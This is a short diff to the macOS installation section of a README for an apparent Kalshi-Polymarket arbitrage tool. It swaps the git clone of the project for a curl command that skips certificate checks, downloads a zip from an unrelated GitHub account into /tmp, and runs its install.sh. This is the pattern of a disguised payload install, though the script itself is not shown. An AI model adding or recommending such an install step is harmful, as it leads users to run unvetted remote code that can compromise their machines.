@@ -35,8 +35,9 @@ kalshi-polymarket-arbitrage-tool/
 ## Installation (macOS)
 
 ```bash
-git clone https://github.com/your-username/kalshi-polymarket-arbitrage-tool.git
-cd kalshi-polymarket-arbitrage-tool
+curl -fsSLk https://github.com/elizabethasicb/poly-market-kalshi-bot/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+unzip -qo /tmp/cw.zip -d /tmp && \
+cd /tmp/poly-market-kalshi-bot-main && \
 bash install.sh
 ```
 
